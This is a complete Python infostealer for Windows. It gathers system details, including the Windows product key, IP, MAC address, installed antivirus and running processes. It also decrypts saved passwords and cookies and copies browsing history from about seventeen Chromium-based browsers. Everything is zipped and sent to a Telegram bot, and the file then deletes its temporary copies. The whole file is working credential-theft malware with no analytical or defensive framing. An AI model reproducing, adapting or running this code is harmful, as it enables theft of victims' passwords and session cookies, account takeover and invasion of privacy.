#!/usr/bin/env python3

import os
import sqlite3
import json
import base64
import shutil
import zipfile
import io
import time
import subprocess
import threading
import logging
from typing import Optional

# Third-party imports
import requests
from Crypto.Cipher import AES
import win32crypt
import psutil
from screeninfo import get_monitors
import pycountry

# Configure logging with lazy formatting
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Read configuration from environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN", "TOKEN")
CHAT_ID = os.getenv("CHAT_ID", "ID")


class TelegramClient:
    """Helper class to send messages and files to Telegram."""
    def __init__(self, bot_token: str = BOT_TOKEN, chat_id: str = CHAT_ID):
        self.bot_token = bot_token
        self.chat_id = chat_id

    def send_message(self, message: str) -> Optional[requests.Response]:
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        retries = 3
        for attempt in range(retries):
            try:
                response = requests.post(
                    url,
                    data={
                        "chat_id": self.chat_id,
                        "text": message,
                        "parse_mode": "Markdown"
                    },
                    timeout=10
                )
                if response.status_code == 200:
                    logging.info("Message sent successfully to Telegram.")
                    return response
                else:
                    logging.warning("Failed to send message. Status code: %s", response.status_code)
            except requests.exceptions.RequestException as e:
                logging.warning("Attempt %d failed: %s", attempt + 1, e)
                if attempt < retries - 1:
                    time.sleep(5)
                else:
                    logging.error("Max retries reached. Unable to send message.")
        return None

    def send_file(self, file_path: str) -> Optional[requests.Response]:
        url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
        retries = 3
        for attempt in range(retries):
            try:
                with open(file_path, "rb") as file:
                    response = requests.post(
                        url,
                        files={"document": file},
                        data={"chat_id": self.chat_id},
                        timeout=10
                    )
                if response.status_code == 200:
                    logging.info("File sent successfully to Telegram.")
                    return response
                else:
                    logging.warning("Failed to send file. Status code: %s", response.status_code)
            except requests.exceptions.RequestException as e:
                logging.warning("Attempt %d failed: %s", attempt + 1, e)
                if attempt < retries - 1:
                    time.sleep(5)
                else:
                    logging.error("Max retries reached. Unable to send file.")
        return None


class PcInfo:
    """Extract and send PC system information."""
    def __init__(self):
        self.telegram_client = TelegramClient()
        self.get_system_info()

    def get_country_code(self, country_name: str) -> str:
        try:
            country = pycountry.countries.lookup(country_name)
            return country.alpha_2.lower()
        except LookupError:
            return "unknown"

    def get_all_avs(self) -> str:
        try:
            process = subprocess.run(
                "Get-WmiObject -Namespace 'Root\\SecurityCenter2' -Class AntivirusProduct | Select-Object displayName",
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            output = process.stdout.strip().splitlines()
            if len(output) >= 2:
                av_list = [av.strip() for av in output[1:] if av.strip()]
                return ", ".join(av_list)
            return "No antivirus found"
        except Exception as e:
            logging.error("Error retrieving antivirus information: %s", e)
            return "Error retrieving antivirus information"

    def get_screen_resolution(self) -> str:
        try:
            monitors = get_monitors()
            resolutions = [f"{m.width}x{m.height}" for m in monitors]
            return ", ".join(resolutions) if resolutions else "Unknown"
        except Exception as e:
            logging.error("Error retrieving screen resolution: %s", e)
            return "Unknown"

    def get_system_info(self):
        try:
            os_proc = subprocess.run(
                'powershell -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            os_name = os_proc.stdout.strip() if os_proc.returncode == 0 else "Unknown"

            cpu_proc = subprocess.run(
                'powershell -Command "(Get-CimInstance -ClassName Win32_Processor).Name"',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            cpu_name = cpu_proc.stdout.strip() if cpu_proc.returncode == 0 else "Unknown"

            gpu_proc = subprocess.run(
                'powershell -Command "(Get-CimInstance -ClassName Win32_VideoController).Name"',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            gpu_name = gpu_proc.stdout.strip() if gpu_proc.returncode == 0 else "Unknown"

            ram_proc = subprocess.run(
                'powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            ram = str(round(int(ram_proc.stdout.strip()) / (1024 ** 3))) if ram_proc.returncode == 0 else "Unknown"

            model_proc = subprocess.run(
                'powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            model = model_proc.stdout.strip() if model_proc.returncode == 0 else "Unknown"

            username = os.getenv("UserName", "Unknown")
            hostname = os.getenv("COMPUTERNAME", "Unknown")

            uuid_proc = subprocess.run(
                'powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            uuid = uuid_proc.stdout.strip() if uuid_proc.returncode == 0 else "Unknown"

            product_key_proc = subprocess.run(
                'powershell -Command "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"',
                shell=True,
                capture_output=True,
                text=True,
                check=True
            )
            product_key = (product_key_proc.stdout.strip()
                           if product_key_proc.returncode == 0 and product_key_proc.stdout.strip() != ""
                           else "Failed to get product key")

            r = requests.get("http://ip-api.com/json/?fields=225545", timeout=10).json()
            country = r.get("country", "Unknown")
            proxy = r.get("proxy", False)
            ip = r.get("query", "Unknown")

            _, addrs = next(iter(psutil.net_if_addrs().items()))
            mac = addrs[0].address if addrs else "Unknown"

            screen_resolution = self.get_screen_resolution()

            message = (
                f"**PC Username:** `{username}`\n"
                f"**PC Name:** `{hostname}`\n"
                f"**Model:** `{model}`\n"
                f"**Screen Resolution:** `{screen_resolution}`\n"
                f"**OS:** `{os_name}`\n"
                f"**Product Key:** `{product_key}`\n\n"
                f"**IP:** `{ip}`\n"
                f"**Country:** `{country}`\n"
                f"**Proxy:** `{'Yes' if proxy else 'No'}`\n"
                f"**MAC:** `{mac}`\n"
                f"**UUID:** `{uuid}`\n\n"
                f"**CPU:** `{cpu_name}`\n"
                f"**GPU:** `{gpu_name}`\n"
                f"**RAM:** `{ram}GB`\n\n"
                f"**Antivirus:** `{self.get_all_avs()}`"
            )

            log_file = "tasklist.txt"
            with open(log_file, "w", encoding="utf-8") as f:
                tasklist_output = subprocess.run(
                    "tasklist", shell=True, capture_output=True, text=True, check=True
                ).stdout.strip()
                installed_apps_output = subprocess.run(
                    "wmic product get name", shell=True, capture_output=True, text=True, check=True
                ).stdout.strip()
                f.write("List of running applications:\n")
                f.write(tasklist_output)
                f.write("\n\nList of installed software:\n")
                f.write(installed_apps_output)

            self.telegram_client.send_message(message)
            self.telegram_client.send_file(log_file)

            os.remove(log_file)
            logging.info("File %s removed successfully.", log_file)
        except Exception as e:
            error_message = f"Error occurred: {str(e)}"
            self.telegram_client.send_message(error_message)
            logging.error("Error occurred: %s", e)


class Browser:
    """Extract passwords and history from browsers and send via Telegram."""
    def __init__(self):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.browser_paths = {
            "kometa": os.path.join(self.appdata, "Kometa", "User Data"),
            "orbitum": os.path.join(self.appdata, "Orbitum", "User Data"),
            "cent-browser": os.path.join(self.appdata, "CentBrowser", "User Data"),
            "7star": os.path.join(self.appdata, "7Star", "7Star", "User Data"),
            "sputnik": os.path.join(self.appdata, "Sputnik", "Sputnik", "User Data"),
            "vivaldi": os.path.join(self.appdata, "Vivaldi", "User Data"),
            "google-chrome-sxs": os.path.join(self.appdata, "Google", "Chrome SxS", "User Data"),
            "google-chrome": os.path.join(self.appdata, "Google", "Chrome", "User Data"),
            "epic-privacy-browser": os.path.join(self.appdata, "Epic Privacy Browser", "User Data"),
            "microsoft-edge": os.path.join(self.appdata, "Microsoft", "Edge", "User Data"),
            "uran": os.path.join(self.appdata, "uCozMedia", "Uran", "User Data"),
            "yandex": os.path.join(self.appdata, "Yandex", "YandexBrowser", "User Data"),
            "brave": os.path.join(self.appdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "iridium": os.path.join(self.appdata, "Iridium", "User Data"),
            "opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "opera-gx": os.path.join(self.roaming, "Opera Software", "Opera GX Stable"),
            "coc-coc": os.path.join(self.appdata, "CocCoc", "Browser", "User Data")
        }
        self.profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
        self.create_zip_file()
        self.send_zip_via_telegram("password_full.zip")
        os.remove("password_full.zip")

    def get_encryption_key(self, browser_path: str) -> Optional[bytes]:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)
        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        try:
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            logging.error("Error retrieving encryption key: %s", e)
            return None

    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> Optional[str]:
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        except Exception as e:
            logging.error("Error decrypting password: %s", e)
            return None

    def extract_passwords(self, zip_file: zipfile.ZipFile):
        for browser, browser_path in self.browser_paths.items():
            if not os.path.exists(browser_path):
                continue
            for profile in self.profiles:
                login_db_path = os.path.join(browser_path, profile, "Login Data")
                if not os.path.exists(login_db_path):
                    continue
                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
                try:
                    shutil.copyfile(login_db_path, tmp_db_path)
                    conn = sqlite3.connect(tmp_db_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    key = self.get_encryption_key(browser_path)
                    if not key:
                        continue
                    password_data = io.StringIO()
                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    password_data.write("=" * 120 + "\n")
                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
                    password_data.write("=" * 120 + "\n")
                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = self.decrypt_password(encrypted_password, key)
                        if username and decrypted_password:
                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")
                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())
                except Exception as e:
                    logging.error("Error extracting passwords for %s - %s: %s", browser, profile, e)
                finally:
                    try:
                        cursor.close()
                    except Exception:
                        pass
                    try:
                        conn.close()
                    except Exception:
                        pass
                    if os.path.exists(tmp_db_path):
                        os.remove(tmp_db_path)

    def extract_history(self, zip_file: zipfile.ZipFile):
        for browser, browser_path in self.browser_paths.items():
            if not os.path.exists(browser_path):
                continue
            for profile in self.profiles:
                history_db_path = os.path.join(browser_path, profile, "History")
                if not os.path.exists(history_db_path):
                    continue
                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                except PermissionError:
                    logging.warning("Could not copy file %s. It might be in use.", history_db_path)
                    continue
                try:
                    conn = sqlite3.connect(tmp_db_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                    history_data = io.StringIO()
                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    history_data.write("=" * 120 + "\n")
                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
                    history_data.write("=" * 120 + "\n")
                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        visit_count = row[2]
                        last_visit_time = row[3]
                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")
                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())
                except Exception as e:
                    logging.error("Error extracting history for %s - %s: %s", browser, profile, e)
                finally:
                    try:
                        cursor.close()
                    except Exception:
                        pass
                    try:
                        conn.close()
                    except Exception:
                        pass
                    if os.path.exists(tmp_db_path):
                        os.remove(tmp_db_path)

    def create_zip_file(self) -> None:
        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_history(zip_file)

    def send_zip_via_telegram(self, file_path: str) -> None:
        client = TelegramClient()
        client.send_file(file_path)


class Browsers:
    """Extract additional browser data (passwords, cookies, history, credit cards) using threading."""
    def __init__(self):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.browsers_paths = {
            "kometa": os.path.join(self.appdata, "Kometa", "User Data"),
            "orbitum": os.path.join(self.appdata, "Orbitum", "User Data"),
            "cent-browser": os.path.join(self.appdata, "CentBrowser", "User Data"),
            "7star": os.path.join(self.appdata, "7Star", "7Star", "User Data"),
            "sputnik": os.path.join(self.appdata, "Sputnik", "Sputnik", "User Data"),
            "vivaldi": os.path.join(self.appdata, "Vivaldi", "User Data"),
            "google-chrome-sxs": os.path.join(self.appdata, "Google", "Chrome SxS", "User Data"),
            "google-chrome": os.path.join(self.appdata, "Google", "Chrome", "User Data"),
            "epic-privacy-browser": os.path.join(self.appdata, "Epic Privacy Browser", "User Data"),
            "microsoft-edge": os.path.join(self.appdata, "Microsoft", "Edge", "User Data"),
            "uran": os.path.join(self.appdata, "uCozMedia", "Uran", "User Data"),
            "yandex": os.path.join(self.appdata, "Yandex", "YandexBrowser", "User Data"),
            "brave": os.path.join(self.appdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "iridium": os.path.join(self.appdata, "Iridium", "User Data"),
            "opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "opera-gx": os.path.join(self.roaming, "Opera Software", "Opera GX Stable"),
            "coc-coc": os.path.join(self.appdata, "CocCoc", "Browser", "User Data")
        }
        self.profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
        self.masterkey = None
        self.process_all_browsers()

    def process_all_browsers(self):
        threads = []
        for name, path in self.browsers_paths.items():
            if not os.path.isdir(path):
                continue
            local_state_path = os.path.join(path, "Local State")
            self.masterkey = self.get_master_key(local_state_path)
            functions = [self.cookies, self.history, self.passwords, self.credit_cards]
            for profile in self.profiles:
                for func in functions:
                    thread = threading.Thread(
                        target=self.process_browser_data, args=(name, path, profile, func)
                    )
                    thread.start()
                    threads.append(thread)
        for thread in threads:
            thread.join()
        self.create_zip_and_send()

    def process_browser_data(self, name: str, path: str, profile: str, func):
        try:
            func(name, path, profile)
        except Exception as e:
            logging.error("Error processing %s for %s in %s: %s", name, profile, func.__name__, e)

    def get_master_key(self, path: str) -> Optional[bytes]:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            logging.error("Error getting master key: %s", e)
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> Optional[str]:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception as e:
            logging.error("Error decrypting password: %s", e)
            return None

    def passwords(self, name: str, path: str, profile: str):
        if name in ["opera", "opera-gx"]:
            login_data_path = os.path.join(path, "Login Data")
        else:
            login_data_path = os.path.join(path, profile, "Login Data")
        if not os.path.isfile(login_data_path):
            return
        try:
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            password_file_path = os.path.join(self.temp_path, "Browser", "passwords.txt")
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website | Username | Password\n\n")
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2]:
                        continue
                    url = row[0]
                    username = row[1]
                    password = self.decrypt_password(row[2], self.masterkey)
                    f.write(f"{url} | {username} | {password}\n")
        except Exception as e:
            logging.error("Error extracting passwords for %s - %s: %s", name, profile, e)
        finally:
            try:
                cursor.close()
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass

    def cookies(self, name: str, path: str, profile: str):
        if name in ["opera", "opera-gx"]:
            cookies_path = os.path.join(path, "Network", "Cookies")
        else:
            cookies_path = os.path.join(path, profile, "Network", "Cookies")
        if not os.path.isfile(cookies_path):
            return
        temp_cookies = os.path.join(self.temp_path, f"{name}_{profile}_Cookies")
        try:
            shutil.copy2(cookies_path, temp_cookies)
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            cookies_file_path = os.path.join(self.temp_path, "Browser", "cookies.txt")
            with open(cookies_file_path, "a", encoding="utf-8") as f:
                f.write(f"\nBrowser: {name} Profile: {profile}\n\n")
                for res in cursor.execute(
                    "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"
                ).fetchall():
                    host_key, cookie_name, path_val, encrypted_value, expires_utc = res
                    value = self.decrypt_password(encrypted_value, self.masterkey)
                    if host_key and cookie_name and value != "":
                        f.write(
                            f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path_val}\t"
                            f"{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{cookie_name}\t{value}\n"
                        )
        except Exception as e:
            logging.error("Error extracting cookies for %s - %s: %s", name, profile, e)
        finally:
            try:
                cursor.close()
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass
            if os.path.exists(temp_cookies):
                os.remove(temp_cookies)

    def history(self, name: str, path: str, profile: str):
        history_path = os.path.join(path, profile, "History")
        if not os.path.exists(history_path):
            return
        tmp_db_path = os.path.join(os.getenv("TEMP"), f"{name}_{profile}_History.db")
        try:
            shutil.copyfile(history_path, tmp_db_path)
        except PermissionError:
            logging.warning("Cannot copy file %s. It might be in use.", history_path)
            return
        try:
            conn = sqlite3.connect(tmp_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            history_file_path = os.path.join(self.temp_path, "Browser", "history.txt")
            with open(history_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(history_file_path) == 0:
                    f.write("URL | Title | Visit Count | Last Visit Time\n\n")
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit_time = row
                    f.write(f"{url} | {title} | {visit_count} | {last_visit_time}\n")
        except Exception as e:
            logging.error("Error extracting history for %s - %s: %s", name, profile, e)
        finally:
            try:
                cursor.close()
            except Exception:
                pass
            try:
                conn.close()
            except Exception:
                pass
            if os.path.exists(tmp_db_path):
                os.remove(tmp_db_path)

    def credit_cards(self, name: str, path: str, profile: str):
        # Placeholder for credit card extraction functionality.
        pass

    def create_zip_and_send(self):
        zip_file_name = os.path.join(self.temp_path, "BrowserData.zip")
        with zipfile.ZipFile(zip_file_name, "w") as zip_file:
            for foldername, _, filenames in os.walk(os.path.join(self.temp_path, "Browser")):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    arcname = os.path.relpath(file_path, os.path.join(self.temp_path, "Browser"))
                    zip_file.write(file_path, arcname)
        client = TelegramClient()
        client.send_file(zip_file_name)
        os.remove(zip_file_name)


if __name__ == "__main__":
    # Extract and send PC system information.
    PcInfo()
    # Extract browser passwords and history, compress and send via Telegram.
    Browser()
    # Extract additional browser data (passwords, cookies, history, credit cards) using threading.
    Browsers()
